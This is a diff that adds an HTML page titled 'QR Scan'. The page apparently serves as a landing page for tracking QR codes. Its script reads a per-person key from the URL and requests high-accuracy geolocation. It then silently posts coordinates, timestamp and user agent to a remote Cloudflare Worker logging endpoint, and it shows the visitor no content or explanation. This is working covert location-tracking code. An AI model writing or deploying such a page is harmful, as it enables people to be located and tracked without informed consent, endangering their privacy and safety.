@@ -1,0 +1,32 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>QR Scan</title>
+</head>
+<body>
+<script>
+  // extract track key from URL
+  const trackKey = new URLSearchParams(window.location.search).get('u') || 'unknown';
+  const LOG_ENDPOINT = 'https://your-worker.yourdomain.workers.dev/log'; // Cloudflare Worker URL
+
+  // request location
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(pos => {
+      fetch(LOG_ENDPOINT, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          track_key: trackKey,
+          timestamp: new Date().toISOString(),
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy_m: pos.coords.accuracy,
+          user_agent: navigator.userAgent,
+        })
+      }).catch(console.error);
+    }, console.warn, { enableHighAccuracy: true });
+  }
+</script>
+</body>
+</html>
